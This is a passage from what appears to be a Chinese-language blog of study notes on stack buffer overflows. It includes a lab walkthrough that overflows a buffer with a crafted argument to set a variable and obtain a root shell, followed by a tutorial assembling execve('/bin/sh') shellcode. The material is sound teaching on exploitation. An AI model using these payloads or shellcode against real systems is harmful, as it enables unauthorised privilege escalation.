class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08048454 ; ==== S U B R O U T I N E ==========================================================================</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454 ; Attributes: bp-based frame</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454                 public pwnthis</span><br><span class=\"line\">.text:08048454 pwnthis         proc near               ; CODE XREF: main+11\u0019p</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454 s               = byte ptr -48h</span><br><span class=\"line\">.text:08048454</span><br><span class=\"line\">.text:08048454                 push    ebp</span><br><span class=\"line\">.text:08048455                 mov     ebp, esp</span><br><span class=\"line\">.text:08048457                 sub     esp, 48h</span><br><span class=\"line\">.text:0804845A                 sub     esp, 0Ch</span><br><span class=\"line\">.text:0804845D                 lea     eax, [ebp+s]</span><br><span class=\"line\">.text:08048460                 push    eax             ; s</span><br><span class=\"line\">.text:08048461                 call    _gets</span><br><span class=\"line\">.text:08048466                 add     esp, 10h</span><br><span class=\"line\">.text:08048469                 nop</span><br><span class=\"line\">.text:0804846A                 leave</span><br><span class=\"line\">.text:0804846B                 retn</span><br><span class=\"line\">.text:0804846B pwnthis         endp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>pwnthis()函数中有且仅有一个危险函数gets(&amp;s);,目标仍然是跳转到函数win()上获得输出code flow successfully changed。</p>\n<p>在IDA pro中双击 char s查看栈的结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-00000048 s               db ?</span><br><span class=\"line\">-00000047                 db ? ; undefined</span><br><span class=\"line\">-00000046                 db ? ; undefined</span><br><span class=\"line\">-00000045                 db ? ; undefined</span><br><span class=\"line\">-00000044                 db ? ; undefined</span><br><span class=\"line\">-00000043                 db ? ; undefined</span><br><span class=\"line\">-00000042                 db ? ; undefined</span><br><span class=\"line\">-00000041                 db ? ; undefined</span><br><span class=\"line\">-00000040                 db ? ; undefined</span><br><span class=\"line\">-0000003F                 db ? ; undefined</span><br><span class=\"line\">-0000003E                 db ? ; undefined</span><br><span class=\"line\">-0000003D                 db ? ; undefined</span><br><span class=\"line\">-0000003C                 db ? ; undefined</span><br><span class=\"line\">-0000003B                 db ? ; undefined</span><br><span class=\"line\">-0000003A                 db ? ; undefined</span><br><span class=\"line\">-00000039                 db ? ; undefined</span><br><span class=\"line\">-00000038                 db ? ; undefined</span><br><span class=\"line\">-00000037                 db ? ; undefined</span><br><span class=\"line\">-00000036                 db ? ; undefined</span><br><span class=\"line\">-00000035                 db ? ; undefined</span><br><span class=\"line\">-00000034                 db ? ; undefined</span><br><span class=\"line\">-00000033                 db ? ; undefined</span><br><span class=\"line\">-00000032                 db ? ; undefined</span><br><span class=\"line\">-00000031                 db ? ; undefined</span><br><span class=\"line\">-00000030                 db ? ; undefined</span><br><span class=\"line\">-0000002F                 db ? ; undefined</span><br><span class=\"line\">-0000002E                 db ? ; undefined</span><br><span class=\"line\">-0000002D                 db ? ; undefined</span><br><span class=\"line\">-0000002C                 db ? ; undefined</span><br><span class=\"line\">-0000002B                 db ? ; undefined</span><br><span class=\"line\">-0000002A                 db ? ; undefined</span><br><span class=\"line\">-00000029                 db ? ; undefined</span><br><span class=\"line\">-00000028                 db ? ; undefined</span><br><span class=\"line\">-00000027                 db ? ; undefined</span><br><span class=\"line\">-00000026                 db ? ; undefined</span><br><span class=\"line\">-00000025                 db ? ; undefined</span><br><span class=\"line\">-00000024                 db ? ; undefined</span><br><span class=\"line\">-00000023                 db ? ; undefined</span><br><span class=\"line\">-00000022                 db ? ; undefined</span><br><span class=\"line\">-00000021                 db ? ; undefined</span><br><span class=\"line\">-00000020                 db ? ; undefined</span><br><span class=\"line\">-0000001F                 db ? ; undefined</span><br><span class=\"line\">-0000001E                 db ? ; undefined</span><br><span class=\"line\">-0000001D                 db ? ; undefined</span><br><span class=\"line\">-0000001C                 db ? ; undefined</span><br><span class=\"line\">-0000001B                 db ? ; undefined</span><br><span class=\"line\">-0000001A                 db ? ; undefined</span><br><span class=\"line\">-00000019                 db ? ; undefined</span><br><span class=\"line\">-00000018                 db ? ; undefined</span><br><span class=\"line\">-00000017                 db ? ; undefined</span><br><span class=\"line\">-00000016                 db ? ; undefined</span><br><span class=\"line\">-00000015                 db ? ; undefined</span><br><span class=\"line\">-00000014                 db ? ; undefined</span><br><span class=\"line\">-00000013                 db ? ; undefined</span><br><span class=\"line\">-00000012                 db ? ; undefined</span><br><span class=\"line\">-00000011                 db ? ; undefined</span><br><span class=\"line\">-00000010                 db ? ; undefined</span><br><span class=\"line\">-0000000F                 db ? ; undefined</span><br><span class=\"line\">-0000000E                 db ? ; undefined</span><br><span class=\"line\">-0000000D                 db ? ; undefined</span><br><span class=\"line\">-0000000C                 db ? ; undefined</span><br><span class=\"line\">-0000000B                 db ? ; undefined</span><br><span class=\"line\">-0000000A                 db ? ; undefined</span><br><span class=\"line\">-00000009                 db ? ; undefined</span><br><span class=\"line\">-00000008                 db ? ; undefined</span><br><span class=\"line\">-00000007                 db ? ; undefined</span><br><span class=\"line\">-00000006                 db ? ; undefined</span><br><span class=\"line\">-00000005                 db ? ; undefined</span><br><span class=\"line\">-00000004                 db ? ; undefined</span><br><span class=\"line\">-00000003                 db ? ; undefined</span><br><span class=\"line\">-00000002                 db ? ; undefined</span><br><span class=\"line\">-00000001                 db ? ; undefined</span><br><span class=\"line\">+00000000  s              db 4 dup(?)</span><br><span class=\"line\">+00000004  r              db 4 dup(?)</span><br></pre></td></tr></table></figure>\n\n<p>其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。</p>\n<p>堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。 堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令 PUSH和POP， 向堆栈中添加元素和从中移去元素。 堆栈由逻辑堆栈帧组成。 当调用函数时逻辑堆栈帧被压入栈中， 当函数返回时逻辑 堆栈帧被从栈中弹出。 堆栈帧包括函数的参数， 函数的局部变量， 以及恢复前一个堆栈 帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。 堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我 们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。 堆栈指针(SP)也是依赖于具体实现的。 它可以指向堆栈的最后地址， 或者指向堆栈之后的下一个空闲可用地址。 在我们的讨论当中， SP指向堆栈的最后地址。 除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定 地址的指针叫做帧指针(FP)。 有些文章把它叫做局部基指针(LB-local base pointer)。 从理论上来说， 局部变量可以用SP加偏移量来引用。 然而， 当有字被压栈和出栈后， 这 些偏移量就变了。 尽管在某些情况下编译器能够跟踪栈中的字操作， 由此可以修正偏移 量， 但是在某些情况下不能。 而且在所有情况下， 要引入可观的管理开销。 而且在有些 机器上， 比如Intel处理器， 由SP加偏移量访问一个变量需要多条指令才能实现。 因此， 许多编译器使用第二个寄存器， FP， 对于局部变量和函数参数都可以引用， 因为它们到FP的距离不会受到PUSH和POP操作的影响。 在Intel CPU中， BP(EBP)用于这 个目的。 在Motorola CPU中， 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP。 考虑到我们堆栈的增长方向， 从FP的位置开始计算， 函数参数的偏移量是正值， 而局部 变量的偏移量是负值。 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以 恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为 例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾 (epilog)工作。 Intel的ENTER和LEAVE指令， Motorola的LINK和UNLINK指令， 都可以用于 有效地序幕和收尾工作。</p>\n<p><strong>步骤1：</strong> 程序源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">vuln</span><span class=\"params\">(<span class=\"keyword\">int</span> tmp, <span class=\"keyword\">char</span> *str)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> win = tmp;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">64</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf, str);</span><br><span class=\"line\">    dump_stack((<span class=\"keyword\">void</span> **) buf, <span class=\"number\">23</span>, (<span class=\"keyword\">void</span> **) &amp;tmp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;win = %d\\n&quot;</span>, win);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (win == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        execl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;sh&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sorry, you lose.\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: stack_overwrite [str]\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"keyword\">uid_t</span> euid = geteuid();</span><br><span class=\"line\">    setresuid(euid, euid, euid);</span><br><span class=\"line\">    vuln(<span class=\"number\">0</span>, argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>步骤2：</strong> 首先，我们打开平台，点击操作机，点击通过web ssh登录进入控制台。</p>\n<p><strong>步骤3：</strong> 我们输入ls，查看当前文件夹下有三个文件，我们尝试cat flag，发现权限缺失，所以我们尝试利用overflow1-3948d17028101c40的漏洞进行攻击。</p>\n<p><strong>步骤4：</strong> 首先，我们的输入是程序的命令行参数。第二，如果我们可以设置win变量等于1，我们会得到一个shell！ 让我们进行cat flag。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./overflow1-3948d17028101c40 $(python -c &#x27;print &quot;A&quot;*64 + &quot;B&quot;&#x27;)</span><br><span class=\"line\">Stack dump:</span><br><span class=\"line\">0xffa81994: 0xffa82845 (second argument)</span><br><span class=\"line\">0xffa81990: 0x00000000 (first argument)</span><br><span class=\"line\">0xffa8198c: 0x0804870f (saved eip)</span><br><span class=\"line\">0xffa81988: 0xffa819b8 (saved ebp)</span><br><span class=\"line\">0xffa81984: 0xf779c000</span><br><span class=\"line\">0xffa81980: 0xf76a8a00</span><br><span class=\"line\">0xffa8197c: 0x00000042</span><br><span class=\"line\">0xffa81978: 0x41414141</span><br><span class=\"line\">0xffa81974: 0x41414141</span><br><span class=\"line\">0xffa81970: 0x41414141</span><br><span class=\"line\">0xffa8196c: 0x41414141</span><br><span class=\"line\">0xffa81968: 0x41414141</span><br><span class=\"line\">0xffa81964: 0x41414141</span><br><span class=\"line\">0xffa81960: 0x41414141</span><br><span class=\"line\">0xffa8195c: 0x41414141</span><br><span class=\"line\">0xffa81958: 0x41414141</span><br><span class=\"line\">0xffa81954: 0x41414141</span><br><span class=\"line\">0xffa81950: 0x41414141</span><br><span class=\"line\">0xffa8194c: 0x41414141</span><br><span class=\"line\">0xffa81948: 0x41414141</span><br><span class=\"line\">0xffa81944: 0x41414141</span><br><span class=\"line\">0xffa81940: 0x41414141</span><br><span class=\"line\">0xffa8193c: 0x41414141 (beginning of buffer)</span><br><span class=\"line\">win = 66</span><br><span class=\"line\">Sorry, you lose.</span><br></pre></td></tr></table></figure>\n\n<p><strong>步骤5：</strong> 你会看到，如果我们填满了缓冲区（“A”* 64）和一个”B”字母，win的值会改变。 对于那些不知道的人，“B”的ascii值是66，这意味着我们可以控制win变量。 我们所要做的就是提交一个ascii值为1的字符。由于这是不可打印的，我们将在python中使用转义序列。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./overflow1-3948d17028101c40 $(python -c &#x27;print &quot;A&quot;*64 + &quot;\\x01&quot;&#x27;)</span><br><span class=\"line\">Stack dump:</span><br><span class=\"line\">0xff828874: 0xff829848 (second argument)</span><br><span class=\"line\">0xff828870: 0x00000000 (first argument)</span><br><span class=\"line\">0xff82886c: 0x0804870f (saved eip)</span><br><span class=\"line\">0xff828868: 0xff828898 (saved ebp)</span><br><span class=\"line\">0xff828864: 0xf77b7000</span><br><span class=\"line\">0xff828860: 0xf76c3aa7</span><br><span class=\"line\">0xff82885c: 0x00000001</span><br><span class=\"line\">0xff828858: 0x41414141</span><br><span class=\"line\">0xff828854: 0x41414141</span><br><span class=\"line\">0xff828850: 0x41414141</span><br><span class=\"line\">0xff82884c: 0x41414141</span><br><span class=\"line\">0xff828848: 0x41414141</span><br><span class=\"line\">0xff828844: 0x41414141</span><br><span class=\"line\">0xff828840: 0x41414141</span><br><span class=\"line\">0xff82883c: 0x41414141</span><br><span class=\"line\">0xff828838: 0x41414141</span><br><span class=\"line\">0xff828834: 0x41414141</span><br><span class=\"line\">0xff828830: 0x41414141</span><br><span class=\"line\">0xff82882c: 0x41414141</span><br><span class=\"line\">0xff828828: 0x41414141</span><br><span class=\"line\">0xff828824: 0x41414141</span><br><span class=\"line\">0xff828820: 0x41414141</span><br><span class=\"line\">0xff82881c: 0x41414141 (beginning of buffer)</span><br><span class=\"line\">win = 1</span><br><span class=\"line\">$</span><br></pre></td></tr></table></figure>\n\n<p><strong>步骤6：</strong> 之后，我们输入id，发现我们已经拿到了root的权限。然后我们再cat flag，这次便成功获取到flag了。</p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记5</span><br></pre></td></tr></table></figure>\n\n<p><strong>shellcode</strong></p>\n<p>是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。</p>\n<p>shellcode基本的编写方式：</p>\n<ul>\n<li>编写c程序实现功能</li>\n<li>使用汇编来替代函数调用等</li>\n<li>汇编编译链接，获取机器码</li>\n</ul>\n<p>这里使用c语言来进行编写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *name[<span class=\"number\">2</span>];</span><br><span class=\"line\">    name[<span class=\"number\">0</span>]=<span class=\"string\">&quot;/bin/sh&quot;</span>;</span><br><span class=\"line\">    name[<span class=\"number\">1</span>]=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    execve(name[<span class=\"number\">0</span>],name,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中execve进行系统调用，通过name[0]提供的参数”/bin/sh”起一个shell。 execve（参数1，参数2，参数3） 参数1：命令所在路径 参数2：命令的集合 参数3：传递给执行文件的环境变量集尝试编译运行。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> gcc shell.c -o shell</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./shell</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> <span class=\"built_in\">echo</span> u got it</span></span><br><span class=\"line\">u got it</span><br></pre></td></tr></table></figure>\n\n<p>用gdb查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb shell -q</span><br><span class=\"line\">pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.</span><br><span class=\"line\">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class=\"line\">Reading symbols from shell...(no debugging symbols found)...done.</span><br><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">   0x0000000000400596 &lt;+0&gt;: push   rbp</span><br><span class=\"line\">   0x0000000000400597 &lt;+1&gt;: mov    rbp,rsp</span><br><span class=\"line\">   0x000000000040059a &lt;+4&gt;: sub    rsp,0x20</span><br><span class=\"line\">   0x000000000040059e &lt;+8&gt;: mov    rax,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x00000000004005a7 &lt;+17&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class=\"line\">   0x00000000004005ab &lt;+21&gt;:    xor    eax,eax</span><br><span class=\"line\">   0x00000000004005ad &lt;+23&gt;:    mov    QWORD PTR [rbp-0x20],0x400674</span><br><span class=\"line\">   0x00000000004005b5 &lt;+31&gt;:    mov    QWORD PTR [rbp-0x18],0x0</span><br><span class=\"line\">   0x00000000004005bd &lt;+39&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class=\"line\">   0x00000000004005c1 &lt;+43&gt;:    lea    rcx,[rbp-0x20]</span><br><span class=\"line\">   0x00000000004005c5 &lt;+47&gt;:    mov    edx,0x0</span><br><span class=\"line\">   0x00000000004005ca &lt;+52&gt;:    mov    rsi,rcx</span><br><span class=\"line\">   0x00000000004005cd &lt;+55&gt;:    mov    rdi,rax</span><br><span class=\"line\">   0x00000000004005d0 &lt;+58&gt;:    call   0x400480 &lt;execve@plt&gt;</span><br><span class=\"line\">   0x00000000004005d5 &lt;+63&gt;:    mov    eax,0x0</span><br><span class=\"line\">   0x00000000004005da &lt;+68&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class=\"line\">   0x00000000004005de &lt;+72&gt;:    xor    rdx,QWORD PTR fs:0x28</span><br><span class=\"line\">   0x00000000004005e7 &lt;+81&gt;:    je     0x4005ee &lt;main+88&gt;</span><br><span class=\"line\">   0x00000000004005e9 &lt;+83&gt;:    call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br><span class=\"line\">   0x00000000004005ee &lt;+88&gt;:    leave</span><br><span class=\"line\">   0x00000000004005ef &lt;+89&gt;:    ret</span><br><span class=\"line\">End of assembler dump.</span><br><span class=\"line\">pwndbg&gt;</span><br></pre></td></tr></table></figure>\n\n<p>其中关键点在 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00000000004005c5 &lt;+47&gt;:   mov    edx,0x0</span><br><span class=\"line\">0x00000000004005ca &lt;+52&gt;:   mov    rsi,rcx</span><br><span class=\"line\">0x00000000004005cd &lt;+55&gt;:   mov    rdi,rax</span><br><span class=\"line\">0x00000000004005d0 &lt;+58&gt;:   call   0x400480 &lt;execve@plt&gt;</span><br></pre></td></tr></table></figure>\n\n<p>传递了三个参数并且call execve()。 直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的call 0x400480 &lt;execve@plt&gt;依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。 对于call 0x400480 &lt;execve@plt&gt;，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n\n<p>这里的0x80是根据al的值进行系统调用。 为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。 先将”/bin/sh”压栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xor eax,eax</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0x68732f2f</span><br><span class=\"line\">push 0x6e69622f</span><br></pre></td></tr></table></figure>\n\n<p>注意这里用xor eax,eax把eax置0，不使用mov eax,0的原因是这样会出现\\x00，shellcode会被gets()这类函数截断。 esp指向当前栈顶，此时即指向”/bin/sh”,我们把esp保存到ebx </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ebx,esp</span><br></pre></td></tr></table></figure>\n\n<p>现在把两个参数压栈，eax为NULL(0)，ebx为”/bin/sh”的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push eax</span><br><span class=\"line\">push ebx</span><br></pre></td></tr></table></figure>\n\n<p>此时esp指向数组argv，把它赋值给ecx。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ecx,esp</span><br><span class=\"line\">xor edx,edx</span><br><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80       ;通过中断0x80进行系统调用</span><br></pre></td></tr></table></figure>\n\n<p>所以有完整的代码： </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">section .text</span><br><span class=\"line\">global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">xor eax,eax</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0x68732f2f</span><br><span class=\"line\">push 0x6e69622f</span><br><span class=\"line\">mov ebx,esp</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">mov ecx,esp</span><br><span class=\"line\">xor edx,edx</span><br><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n\n<p>保存为shell.asm，使用nasm编译，链接，运行（nasm可以使用 sudo apt-get install nasm 进行安装）</p>\n<figure 